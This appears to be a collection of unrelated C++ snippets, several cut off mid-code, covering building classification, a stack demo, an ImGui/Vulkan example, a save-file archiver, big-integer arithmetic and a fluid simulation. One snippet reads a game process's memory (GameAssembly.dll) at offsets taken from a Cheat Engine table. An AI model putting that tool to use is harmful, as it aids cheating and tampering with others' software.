    "#include <iostream>\n#include <vector>\n#include <tuple>\n#include <cmath>\n#include <string>\n#include <functional>\n#include <algorithm>\n#include <unordered_map>\n#include <mutex>\n#include <atomic>\n#include <memory>\n#include <chrono>\n#include <numeric>\n#include <thread>\n#include <unordered_set>\n#include <random>\n\n#include <mlpack.hpp>\n\n#include \"ogrsf_frmts.h\"\n#include <ogr_geometry.h>\n#include \"classifications.hpp\"\n\n// namespace fs = std::filesystem;\n\n// classification\n\nvoid cl::Cl_bild::logistic_factory(std::unique_ptr<preparation::Buildings>& prepared_bds, std::unique_ptr<preparation::Buildings>& without_factories,\n        std::unique_ptr<cl::Cl_bild>& final_data){\n    v_doub cat_from_genplan;\n    v_doub cat_simpl;\n    v_doub amen_d = prepared_bds->amenities_density;\n    v_doub center_d = prepared_bds->distance_to_center;\n\n    for (std::string icateg:prepared_bds->symplified_categ){\n        if (icateg == \"detached_h\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"multi_h\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"commerical\"){\n            cat_simpl.push_back(static_cast<double>(0));\n        } else if (icateg == \"factory\"){\n            cat_simpl.push_back(static_cast<double>(1));\n        } else {\n            cat_simpl.push_back(static_cast<double>(2));\n        }\n    }\n\n    for (std::string gen_categ:prepared_bds->genplan_categ){\n        if (gen_categ == \"res_low\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"res_4_9\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"res_9plus\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"office\"){\n            cat_from_genplan.push_back(static_cast<double>(0));\n        } else if (gen_categ == \"factory\"){\n            cat_from_genplan.push_back(static_cast<double>(1));\n        } else {\n            cat_from_genplan.push_back(static_cast<double>(2));\n        }\n    }\n\n    v_doub train_gen;\n    v_doub train_simpl;\n    v_doub train_amenity;\n    v_doub train_center;\n    std::vector<size_t> lbls;\n    v_longlong train_id;\n\n    v_doub test_gen;\n    v_doub test_simpl;\n    v_doub test_amenity;\n    v_doub test_center;\n    v_longlong test_id;\n\n    if ((cat_from_genplan.size() == cat_simpl.size()) && (amen_d.size() == center_d.size())){\n        for (unsigned long i = 0; i != cat_from_genplan.size(); i++){\n\n            if ((cat_simpl.at(i) == static_cast<double>(1)) && (cat_from_genplan.at(i) == static_cast<double>(1))){\n\n                train_gen.push_back(cat_from_genplan.at(i));\n                train_simpl.push_back(cat_simpl.at(i));\n                train_amenity.push_back(amen_d.at(i));\n                train_center.push_back(center_d.at(i));\n                train_id.push_back(prepared_bds->osm_id_vec.at(i));\n                // Create factory objects in cl class\n                \n                OGRPoint centroid_1;\n                prepared_bds->ogr_poly_vec.at(i).Centroid(&centroid_1);\n                point_vector.push_back(centroid_1);\n                category.push_back(\"factory\");\n                levels.push_back(prepared_bds->levels.at(i));\n                area.push_back(prepared_bds->square_vec.at(i));\n                relative_density.push_back(prepared_bds->relative_density.at(i));\n\n                lbls.push_back(static_cast<size_t>(1));\n\n            } else if ((cat_simpl.at(i) == static_cast<double>(0)) && (cat_from_genplan.at(i) == static_cast<double>(0)) \n                                                                    && (prepared_bds->genplan_categ.at(i) != \"res_low\")){\n\n                train_gen.push_back(cat_from_genplan.at(i));\n                train_simpl.push_back(cat_simpl.at(i));\n                train_amenity.push_back(amen_d.at(i));\n                train_center.push_back(center_d.at(i));\n                train_id.push_back(prepared_bds->osm_id_vec.at(i));\n                lbls.push_back(static_cast<size_t>(0));\n                // Create non factory object in class to continue classify\n\n                without_factories->amenities_density.push_back(prepared_bds->amenities_density.at(i));\n                without_factories->bc_buildings.push_back(prepared_bds->bc_buildings.at(i));\n                without_factories->building_type_vec.push_back(prepared_bds->building_type_vec.at(i));\n                without_factories->cc_buildings.push_back(prepared_bds->cc_buildings.at(i));\n                without_factories->distance_to_center.push_back(prepared_bds->distance_to_center.at(i));\n                without_factories->genplan_categ.push_back(prepared_bds->genplan_categ.at(i));\n                without_factories->levels.push_back(prepared_bds->levels.at(i));\n                without_factories->ogr_poly_vec.push_back(prepared_bds->ogr_poly_vec.at(i));\n                without_factories->osm_id_vec.push_back(prepared_bds->osm_id_vec.at(i));\n\n        ",
    "#include<iostream>\r\n#include<stack>\r\n#include<time.h>\r\nusing namespace std;\r\n//persona.h\r\nclass Persona{\r\n\tprivate:\r\n\t\tstring nombre;\r\n\t\tint edad;\r\n\tpublic:\r\n\t\t//Constructores\r\n\t\tPersona();\t\r\n\t\t//ingreso - set\r\n\t\tvoid setNombre(string nombre);\r\n\t\tvoid setEdad(int edad);\r\n\t\t//obtener - get\r\n\t\tstring getNombre();\r\n\t\tint getEdad();\r\n\t\t//otros metodos\r\n\t\tstring obtenerDatos();\r\n};\r\n//persona.cpp\r\nPersona::Persona(){\r\n\tnombre=\"S/N\";\r\n\tedad=0;\r\n};\r\n//ingreso - set\r\nvoid Persona::setNombre(string nombre){\r\n\tthis->nombre=nombre;\r\n};\r\nvoid Persona::setEdad(int edad){\r\n\tthis->edad=edad;\r\n};\r\n//obtener - get\r\nstring Persona::getNombre(){\r\n\treturn nombre;\r\n};\r\nint Persona::getEdad(){\r\n\treturn edad;\r\n};\r\n//otros metodos\r\nstring Persona::obtenerDatos(){\r\n\treturn (getNombre()+\" \"+to_string(getEdad()));\r\n};\r\n//librerias.h\r\nvoid menu();\r\nvoid ingresoDatos(stack<Persona> &pila);\r\nvoid obtenerDatos(stack<Persona> &pila);\r\nint main(){\r\n\tstack<Persona> pila;\r\n\r\n\tint op;\r\n\tsystem(\"color 97\");\r\n\tdo{\r\n\t\tsystem(\"cls\");\r\n\t\tmenu();\t\r\n\t\tcin>>op;\r\n\t\tswitch(op){\r\n\t\t\tcase 1:\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tingresoDatos(pila);\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcout<<\"****** Datos Pila ******\\n\";\r\n\t\t\t\tobtenerDatos(pila);\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcout<<\"\\tFin de Programa\\n\";\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tcout<<\"\\tError\\n\";\r\n\t\t\t\tsystem(\"pause\");\r\n\t\t\t\tbreak;\t\t\t\r\n\t\t}\r\n\t}while(op!=3);\r\n\treturn 0;\r\n};\r\n//librerias.cpp\r\nvoid menu(){\r\n\tcout<<\"1.- Ingreso de Datos\\n\";\r\n\tcout<<\"2.- Obtener de Datos\\n\";\r\n\tcout<<\"3.- Salir\\n\";\r\n\tcout<<\"Ingrese una Opcion: \";\r\n};\r\nvoid ingresoDatos(stack<Persona> &pila){\r\n\tstring nombre;\r\n\tint edad;\r\n\tPersona persona;\r\n\tcout<<\"Ingrese el nombre: \";\r\n\tgetline(cin>>ws,nombre);\r\n\tsrand(time(NULL));\r\n\tedad=0+rand()%(101);\r\n\tcout<<\"Edad: \"<<edad<<endl;\r\n\t//guardar los datos en el objeto\r\n\tpersona.setNombre(nombre);\r\n\tpersona.setEdad(edad);\r\n\t//guardar el objeto en la pila\r\n\tpila.push(persona);\r\n};\r\nvoid obtenerDatos(stack<Persona> &pila){\r\n\tif(pila.size()>0){\r\n\t\twhile(!pila.empty()){\r\n\t\t\tcout<<pila.top().getNombre()<<\" \"<<pila.top().getEdad()<<endl;\r\n\t\t\tpila.pop();\r\n\t\t}\r\n\t}else{\r\n\t\tcout<<\"\\tPila Vacia !!!!!!!!!!!\\n\";\r\n\t}\r\n};",
    "// Dear ImGui: standalone example application for SDL2 + Vulkan\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// Important note to the reader who wish to integrate imgui_impl_vulkan.cpp/.h in their own engine/app.\n// - Common ImGui_ImplVulkan_XXX functions and structures are used to interface with imgui_impl_vulkan.cpp/.h.\n//   You will use those if you want to use this rendering backend in your engine/app.\n// - Helper ImGui_ImplVulkanH_XXX functions and structures are only used by this example (main.cpp) and by\n//   the backend itself (imgui_impl_vulkan.cpp), but should PROBABLY NOT be used by your own engine/app code.\n// Read comments in imgui_impl_vulkan.h.\n\n#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_vulkan.h\"\n#include <stdio.h>          // printf, fprintf\n#include <stdlib.h>         // abort\n#include <SDL.h>\n#include <SDL_vulkan.h>\n#include <vulkan/vulkan.h>\n//#include <vulkan/vulkan_beta.h>\n\n//#define APP_USE_UNLIMITED_FRAME_RATE\n#ifdef _DEBUG\n#define APP_USE_VULKAN_DEBUG_REPORT\n#endif\n\n// Data\nstatic VkAllocationCallbacks*   g_Allocator = nullptr;\nstatic VkInstance               g_Instance = VK_NULL_HANDLE;\nstatic VkPhysicalDevice         g_PhysicalDevice = VK_NULL_HANDLE;\nstatic VkDevice                 g_Device = VK_NULL_HANDLE;\nstatic uint32_t                 g_QueueFamily = (uint32_t)-1;\nstatic VkQueue                  g_Queue = VK_NULL_HANDLE;\nstatic VkDebugReportCallbackEXT g_DebugReport = VK_NULL_HANDLE;\nstatic VkPipelineCache          g_PipelineCache = VK_NULL_HANDLE;\nstatic VkDescriptorPool         g_DescriptorPool = VK_NULL_HANDLE;\n\nstatic ImGui_ImplVulkanH_Window g_MainWindowData;\nstatic uint32_t                 g_MinImageCount = 2;\nstatic bool                     g_SwapChainRebuild = false;\n\nstatic void check_vk_result(VkResult err)\n{\n    if (err == 0)\n        return;\n    fprintf(stderr, \"[vulkan] Error: VkResult = %d\\n\", err);\n    if (err < 0)\n        abort();\n}\n\n#ifdef APP_USE_VULKAN_DEBUG_REPORT\nstatic VKAPI_ATTR VkBool32 VKAPI_CALL debug_report(VkDebugReportFlagsEXT flags, VkDebugReportObjectTypeEXT objectType, uint64_t object, size_t location, int32_t messageCode, const char* pLayerPrefix, const char* pMessage, void* pUserData)\n{\n    (void)flags; (void)object; (void)location; (void)messageCode; (void)pUserData; (void)pLayerPrefix; // Unused arguments\n    fprintf(stderr, \"[vulkan] Debug report from ObjectType: %i\\nMessage: %s\\n\\n\", objectType, pMessage);\n    return VK_FALSE;\n}\n#endif // APP_USE_VULKAN_DEBUG_REPORT\n\nstatic bool IsExtensionAvailable(const ImVector<VkExtensionProperties>& properties, const char* extension)\n{\n    for (const VkExtensionProperties& p : properties)\n        if (strcmp(p.extensionName, extension) == 0)\n            return true;\n    return false;\n}\n\nstatic VkPhysicalDevice SetupVulkan_SelectPhysicalDevice()\n{\n    uint32_t gpu_count;\n    VkResult err = vkEnumeratePhysicalDevices(g_Instance, &gpu_count, nullptr);\n    check_vk_result(err);\n    IM_ASSERT(gpu_count > 0);\n\n    ImVector<VkPhysicalDevice> gpus;\n    gpus.resize(gpu_count);\n    err = vkEnumeratePhysicalDevices(g_Instance, &gpu_count, gpus.Data);\n    check_vk_result(err);\n\n    // If a number >1 of GPUs got reported, find discrete GPU if present, or use first one available. This covers\n    // most common cases (multi-gpu/integrated+dedicated graphics). Handling more complicated setups (multiple\n    // dedicated GPUs) is out of scope of this sample.\n    for (VkPhysicalDevice& device : gpus)\n    {\n        VkPhysicalDeviceProperties properties;\n        vkGetPhysicalDeviceProperties(device, &properties);\n        if (properties.deviceType == VK_PHYSICAL_DEVICE_TYPE_DISCRETE_GPU)\n            return device;\n    }\n\n    // Use first GPU (Integrated) is a Discrete one is not available.\n    if (gpu_count > 0)\n        return gpus[0];\n    return VK_NULL_HANDLE;\n}\n\nstatic void SetupVulkan(ImVector<const char*> instance_extensions)\n{\n    VkResult err;\n\n    // Create Vulkan Instance\n    {\n        VkInstanceCreateInfo create_info = {};\n        create_info.sType = VK_STRUCTURE_TYPE_INSTANCE_CREATE_INFO;\n\n        // Enumerate available extensions\n        uint32_t properties_count;\n        ImVector<VkExtensionProperties> properties;\n        vkEnumerateInstanceExtensionProperties(nullptr, &properties_count, nullptr);\n        properties.resize(properties_count);\n        err = vkEnumerateInstanceExtensionProperties(nullptr, &properties_count, properties.Data);\n        check_vk_result(err);\n\n        // Enable required extensions\n        if (IsExtensionAvailable(properties, VK_KHR_GET_PHYSICAL_DEVICE_PROPERTIES_2_EXTENSION_NAME))\n            instance_extensions.push_back(VK_KHR_GET_PHYSICAL_DEVICE_PROPERTIES_2_EXTENSION_NAME);\n#ifdef VK_KHR_PORTABILITY_ENUMERATION_EX",
    "#include <iostream>\n\nint main(){\n    \n    std::string name,addr;\n    int age;\n\n    std::cout << \"Enter your full name: \";\n    // std::cin >> name; if we take the string input like this then string will not take input after whitespace so lets use. getline() function.\n    std::getline(std::cin, name);  //this line of code now can take whitespace as an input\n\n    std::cout << \"Enter your age: \";\n    std::cin >> age;\n\n    /*\n    So if we take an char or string as an input just after another int or float. There will be an '\\n' new line character at the input buffer and we don't pick up \n    the new line character. When we get in the getline() function it accepts the '\\n' new line buffer.\n    \n    std::cout << \"Enter your address: \";\n    std::getline(std::cin, addr);\n\n    So to prevent that from happening we can make a little change in getline() function:\n    */\n\n    std::cout << \"Enter your address: \";\n    std::getline(std::cin >> std::ws, addr); // `std::ws` will remove any white spaces or new line character. before any user input\n    \n\n    std::cout << \"Hello \" << name;\n    std::cout << \"\\nYou are \" << age << \" years old.\\n\";\n    std::cout << \"You are from \" << addr << std::endl;\n}\n",
    "#include <string>\n#include <windows.h>\n#include <ShlObj.h>\n#include <iostream>\n\n#include \"comReader.h\"\n#include \"fileUtils.h\"\n#include \"MyExpection.h\"\n\nst_time::st_time()\n{\n        auto now = std::chrono::system_clock::now();\n        auto time = std::chrono::system_clock::to_time_t(now);\n        auto lt = std::localtime(&time);\n\n        year = lt->tm_year + 1900;\n        month = lt->tm_mon + 1; // \u6708\u4efd\u4ece0\u5f00\u59cb\u8ba1\u7b97\uff0c\u6240\u4ee5\u9700\u8981\u52a0\u4e0a1\n        day = lt->tm_mday;\n        hour = lt->tm_hour;\n        minute = lt->tm_min;\n        second = lt->tm_sec;\n}\n////////////////////////////////////////\n\nvoid fileUtils::saveLog()\n{\n    infofile.open(infopath,std::ios::out|std::ios::binary);\n    infofile.write(reinterpret_cast<char*>(infos.data()),sizeof(inform)*infos.size());\n    infofile.close();\n}\n\nvoid fileUtils::save(inform info)\n{\n    fs::path newArchpath = crrpath;\n    newArchpath.append(\"Archive\"+std::to_string(infos.size()));\n    fs::create_directories(newArchpath);\n    fs::copy(datapath,newArchpath,fs::copy_options::recursive);\n    infos.push_back(info);\n    saveLog();\n}\n\nvoid fileUtils::delArchive(int index)\n{\n    fs::path p=crrpath;\n    p.append(\"Archive\"+std::to_string(index));\n    try {\n        fs::remove_all(p);\n        fs::path old;\n        while(index<(int)(infos.size()-1))\n        {\n            old=crrpath;\n            old.append(\"Archive\"+std::to_string(index+1));\n            fs::rename(old,p);\n            p=old;\n            index++;\n        }\n        infos.erase(infos.begin()+index);\n        saveLog();\n    } catch (const std::filesystem::filesystem_error& e) {\n        std::cout<<e.what()<<std::endl;\n        throw MyExpection(\"\u672a\u80fd\u5220\u9664\u5b58\u6863\");\n    }\n}\n\nvoid fileUtils::loadArchive(int index)\n{\n    try\n    {\n        fs::remove_all(datapath);\n        fs::create_directories(datapath);\n        fs::path p=crrpath;\n        p.append(\"Archive\"+std::to_string(index));\n        fs::copy(p,datapath,fs::copy_options::recursive);\n    }\n    catch(const std::exception& e)\n    {\n        std::cout << e.what() << '\\n';\n        throw MyExpection(\"\u8bfb\u6863\u5931\u8d25\");\n    }\n}\n\ndouble fileUtils::getUsageSpace()\n{\n    std::uintmax_t size = 0;\n\n    for (const auto& entry : fs::recursive_directory_iterator(crrpath))\n        if (fs::is_regular_file(entry))\n            size += fs::file_size(entry);\n\n    return static_cast<double>(size) / (1024 * 1024);\n}\n\n///////////////////////////////////////\nfileUtils::fileUtils()\n{\n    char path[MAX_PATH];\n    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path)))\n        throw MyExpection(\"\u65e0\u6cd5\u627e\u5230\u7cfb\u7edfAppData\u6587\u4ef6\u5939\");\n    datapath.assign(path);\n    if (!fs::exists(datapath))\n        throw MyExpection(\"\u65e0\u6cd5\u627e\u5230\u7cfb\u7edfAppData\u6587\u4ef6\u5939\");\n    datapath=datapath.parent_path().append(\"LocalLow\\\\Nolla_Games_Noita\\\\save00\");\n    if (!fs::exists(datapath))\n        throw MyExpection(\"\u65e0\u6cd5\u627e\u5230Noita\u5b58\u6863\u6587\u4ef6\u5939  \u8bf7\u68c0\u67e5Noita\u662f\u5426\u5b89\u88c5\");\n    crrpath=fs::current_path();\n    crrpath.append(\"Archive\");\n    fs::create_directory(crrpath);\n\n    infopath=crrpath;\n    infopath.append(\"information.log\");\n    if (!fs::exists(infopath))\n    {\n        std::fstream f(infopath,std::ios::out);\n        if (!f.is_open())\n            throw MyExpection(\"\u521b\u5efa\u65e5\u5fd7\u6587\u4ef6\u5931\u8d25\");\n        f.close();\n    }\n    else{\n        infofile.open(infopath,std::ios::in|std::ios::binary);\n        if (!infofile.is_open())\n            throw MyExpection(\"\u6253\u5f00\u65e5\u5fd7\u6587\u4ef6\u5931\u8d25\");\n\n        infofile.seekg(0, std::ios::end);\n        size_t file_size = infofile.tellg();\n        if (file_size)\n        {\n            infofile.seekg(0,std::ios::beg);\n            infos=std::vector <inform> (file_size/sizeof(inform));\n            try\n            {\n                infofile.read(reinterpret_cast<char*>(infos.data()),file_size);\n            }\n            catch(const std::exception& e)\n            {\n                throw MyExpection(\"\u8bfb\u53d6\u65e5\u5fd7\u6587\u4ef6\u5931\u8d25(Archive\u6587\u4ef6\u5939\u4e0b\u7684information.log\u635f\u574f)\");\n            }\n        }\n        infofile.close();\n    }\n}\n\nfileUtils::~fileUtils()\n{\n}\n",
    "#include \"BigNumber.h\"\n\n// regex function that checks the validation of the input.\nbool BigDecimalInt :: checkValidInput(string input)\n{\n    regex validInput(\"[-+]?[0-9]+\");\n    return regex_match(input, validInput);\n}\n\n// constructor that takes a string as an input.\nvoid BigDecimalInt :: setNumber(string num)\n{\n    bool validNumber = checkValidInput(num);\n    if(validNumber)\n    {\n        number = num;\n        if(number[0] == '+')\n        {\n            number.erase(0,1);\n            signNumber = '+';\n        }\n        else if (number[0] == '-')\n        {\n            number.erase(0,1);\n            signNumber = '-';\n        }\n        else\n        {\n            signNumber = '+';\n        }\n    }\n    else\n    {\n        cout << \"Invalid\" << \"\\n\";\n        exit(1);\n    }\n}\n\n// operator < overloading function.\nbool BigDecimalInt :: operator < (const BigDecimalInt& anotherDec)\n{\n    string comp1 = \"\", comp2 = \"\";\n    long long len1 = number.length(), len2 = anotherDec.number.length();\n\n    while (len1 < len2){\n        comp1 += '0';\n        len1++;\n    }\n    while (len2 < len1){\n        comp2 += '0';\n        len2++;\n    }\n    comp1 += number;\n    comp2 += anotherDec.number;\n\n    if(signNumber == '-' && anotherDec.signNumber == '+')\n    {\n        return true;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '-')\n    {\n        return false;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '+')\n    {\n        return comp1 < comp2;\n    }\n    else\n    {\n        return comp1 > comp2;\n    }\n}\n\n// operator > overloading function.\nbool BigDecimalInt :: operator > (const BigDecimalInt &anotherDec)\n{\n    string comp1 = \"\", comp2 = \"\";\n    long long len1 = number.length(), len2 = anotherDec.number.length();\n\n    while (len1 < len2){\n        comp1 += '0';\n        len1++;\n    }\n    while (len2 < len1){\n        comp2 += '0';\n        len2++;\n    }\n    comp1 += number;\n    comp2 += anotherDec.number;\n\n    if(signNumber == '-' && anotherDec.signNumber == '+')\n    {\n        return false;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '-')\n    {\n        return true;\n    }\n    else if(signNumber == '+' && anotherDec.signNumber == '+')\n    {\n        return comp1 > comp2;\n    }\n    else\n    {\n        return comp1 < comp2;\n    }\n}\n\n// operator == overloading function.\nbool BigDecimalInt :: operator == (const BigDecimalInt anotherDec)\n{\n    if (signNumber == anotherDec.signNumber && number == anotherDec.number)\n    {\n        return true;\n\n    }\n    else\n    {\n        return false;\n    }\n}\n\n// operator = overloading function.\nBigDecimalInt& BigDecimalInt :: operator = (BigDecimalInt anotherDec)\n{\n    signNumber = anotherDec.signNumber;\n    number = anotherDec.number;\n    return *this;\n}\n\n//addition implementation.\nstring addition(string num1,string num2)\n{\n    auto it1 = num1.rbegin();\n    auto it2 = num2.rbegin();\n    string res = \"\";\n    int carry = 0;\n    while (it1 != num1.rend())\n    {\n        int twoDigitsSum;\n        carry = 0;\n        twoDigitsSum = ((*it1 - '0') + (*it2 - '0'));\n        if (twoDigitsSum >= 10)\n        {\n            carry = 1;\n        }\n        res = char((twoDigitsSum % 10) + '0') + res;\n        *(it1 + 1) = char(((*(it1 + 1) - '0') + carry) + '0');\n        it1++;\n        it2++;\n    }\n    if (carry)\n    {\n        res = char((carry) + '0') + res;\n    }\n    return res;\n}\n\n//subtraction implementation\nstring subtraction(string num1,string num2){\n    deque<long long>d;\n    string res;\n\n    for (long long i = num1.length() - 1; i >= 0; i--)\n    {\n        if (num1[i] < num2[i])\n        {\n            num1[i] = char (((num1[i] - '0') + 10) + '0');\n            num1[i - 1] = char (((num1[i - 1] - '0') - 1) + '0');\n            d.push_front((num1[i] - '0') - (num2[i] - '0'));\n        }\n        else\n        {\n            d.push_front((num1[i] - '0') - (num2[i] - '0'));\n        }\n    }\n\n    for (auto i : d)\n    {\n        res += to_string(i);\n    }\n    return res;\n}\n\n// // operator + overloading function.\nBigDecimalInt BigDecimalInt :: operator + (BigDecimalInt number2)\n{\n    BigDecimalInt result;\n    char signNumber1 = signNumber, signNumber2 = number2.signNumber;\n    string num1 = number, num2 = number2.number;\n    BigDecimalInt number1 = *this;\n\n    while (num1.length() < num2.length()){\n        num1 = '0' + num1;\n    }\n    while (num2.length() < num1.length()){\n        num2 = '0' + num2;\n    }\n\n    if (signNumber1 == signNumber2){\n        result.signNumber = signNumber1;\n        result.number = addition(num1,num2);\n\n    }else{\n\n        if(number1.signNumber == '-')\n        {\n            number1.signNumber = '+';\n            result = (number2 - number1);\n        }\n        else{\n            number2.signNumber = '+';\n            result = (number1 - number2);\n        }\n    }\n    return result;\n}\n\n// operator - overloading function.\nBigDecimalInt BigDecimalInt :: operator - (BigDecimalInt anotherDec)\n{\n    BigDecimalInt obj;\n    deque<long long> d;\n    string strmin = \"\", res = \"\";\n    s",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cat_fact\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"um.h\"\r\n#include \"json.h\"\r\n#include <fstream>\r\n\r\nusing nlohmann::json;\r\n\r\nint main( ) {\r\n    // Setup\r\n    cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup();\r\n\r\n    // Get module\r\n    auto game_assembly = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module(L\"GameAssembly.dll\");\r\n\r\n    // Read JSON input\r\n    std::ifstream input(\"json.txt\");\r\n    nlohmann::json crazy_swag;\r\n    input >> crazy_swag;\r\n    input.close();\r\n\r\n    // Open output file\r\n    std::ofstream output(\"material_output.txt\");\r\n\r\n    // Process each entry in the JSON\r\n    auto crazy_sneed = crazy_swag[\"CheatTable\"][\"CheatEntries\"][\"CheatEntry\"];\r\n    for (auto& entry : crazy_sneed) {\r\n        // Extract address\r\n        std::string addr_s = entry[\"Address\"];\r\n        unsigned long long crazy_value;\r\n        std::istringstream iss(addr_s);\r\n        iss >> std::hex >> crazy_value;\r\n        crazy_value -= 0x88;\r\n\r\n        // Read name\r\n        char material_name[255];\r\n        auto material_addy = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uintptr_t>(crazy_value + 0x30);\r\n        cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read(material_addy, material_name, 255);\r\n        material_name[254] = 0;\r\n        std::string name(material_name);\r\n\r\n        // Read key\r\n        auto material_address = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uint32_t>(crazy_value + 0x8);\r\n\r\n        // Write to output file\r\n        output << \"material name: \" << name << \", material address: \" << material_address << \"\\n\";\r\n    }\r\n\r\n    // Close output file\r\n    output.close();\r\n\r\n    return 0;\r\n}",
    "/** \u8be5\u7a0b\u5e8f\u7528\u4e8e\u8ba1\u7b97\u6052\u5b9a\u901f\u5ea6\u5165\u53e3\u6d41\n *  \n *  \u6ce8\u610f NEEM \u65b9\u6cd5\u4e00\u5b9a\u8981\u5148\u8ba1\u7b97\u8fb9\uff0c\u7136\u540e\u8ba1\u7b97\u89d2\u70b9\n *  \u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u786e\u4fdd\u8ba1\u7b97\u89d2\u70b9\u65f6\u4e0d\u4f1a\u53d6\u5230\u8fb9\u4e0a\u672a\u66f4\u65b0\u7684\u5206\u5e03\u51fd\u6570\u503c\n * \n *  (xy plane): z = 0  \u6052\u901f\u5ea6\u5165\u53e3\uff0cz == nz-1 \u6052\u538b\u529b\u51fa\u53e3\u4e14\u6d41\u5411\u901f\u5ea6\u5145\u5206\u53d1\u5c55\u5207\u5411\u901f\u5ea6\u4e3a 0 \n * \n *  \u89d2\u70b9\u4f5c\u4e3a\u51fa\u5165\u53e3\u5904\u7406\n */\n\n// open Debug\n// #define MY_DEBUG\n\n// using Incompressible SRT Equillibrium\n#define MY_INCOMPRESSIBLE\n\n#define MY_OMP_OPEN\n#ifdef MY_OMP_OPEN\n    #include <omp.h>\n#endif\n\n#include \"src/GlobalDef.hpp\"\n#include \"src/Array.hpp\"\n#include \"src/Field.hpp\"\n#include \"src/Units.hpp\"\n#include \"src/D3Q19BGK.hpp\"\n#include <ctime>\n#include <cmath>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <sstream>\n#include <algorithm>\n\ntypedef Real T;\ntypedef units::IncompFlowParam<T> SimParam;\ntypedef lbmodels::d3q19::D3Q19BGK<T> LBM;\n\nLBM::DensityField rhoF;\nLBM::VelocityField velF, velF0;\nLBM::LatticeField latticeF, latticeF0;\n\nT feq_i(int i, LBM::Density_t rho, LBM::Velocity_t vel, T uSqr);\nvoid init(SimParam const& param);\nvoid evolution(SimParam const& param);\nT ErrorVel();\nT AverageRho();\nvoid writeData(int t);\n\nint main(int argc, char const *argv[])\n{\n#ifdef MY_OMP_OPEN\n    std::cout << \"Number of processer used: \" << omp_get_num_procs() << std::endl;\n#endif\n    time_t t_start, t_end;\n    T avg_rho, err_vel;\n    int info_step = 100;\n    int out_step = 2000;\n\n    T Re = 10.0;\n    T la_Umax = 0.05; // inlet velocity\n    T la_Cs = LBM::cs;\n    int resolution = 100;\n    T lx = 1;\n    T ly = 1;\n    T lz = 5;\n    SimParam const ldc_param(Re, la_Umax, la_Cs, resolution, lx, ly, lz);\n    std::cout << ldc_param;\n\n    init(ldc_param);\n    writeData(0);\n    t_start = time(NULL);\n    for (int t=0; true; ++t) {\n        evolution(ldc_param);\n        if (t%info_step == 0) {\n            avg_rho = AverageRho();\n            err_vel = ErrorVel();\n            t_end = time(NULL);\n            std::cout << \"[\" << difftime(t_end, t_start) << \" s]\"\n                      << \" Time step: \" << t\n                      << \" avg_rho: \" << std::setprecision(6) << avg_rho\n                      << \" relative error: \" \n                      << std::setiosflags(std::ios::scientific)\n                      << err_vel\n                      << std::resetiosflags(std::ios::scientific)\n                      << std::endl;\n            if ( t >= out_step) {\n                if (t%out_step == 0) { writeData(t); }\n                if ( err_vel < 1.0e-10 ) {\n                    writeData(t);\n                    break;\n                }\n            }\n        }\n    }\n    return 0;\n}\n\nT feq_i(int i, LBM::Density_t rho, LBM::Velocity_t u, T uSqr)\n{\n    T feq, uci;\n    uci = LBM::c[i][0]*u[0] + LBM::c[i][1]*u[1] + LBM::c[i][2]*u[2];\n#ifdef MY_INCOMPRESSIBLE\n    feq = LBM::t[i]*(rho + LBM::invCs2*uci + 0.5*LBM::invCs2*(LBM::invCs2*uci*uci - uSqr));\n#else\n    feq = rho*LBM::t[i]*(1.0 + LBM::invCs2*uci + 0.5*LBM::invCs2*(LBM::invCs2*uci*uci - uSqr));\n#endif\n    return 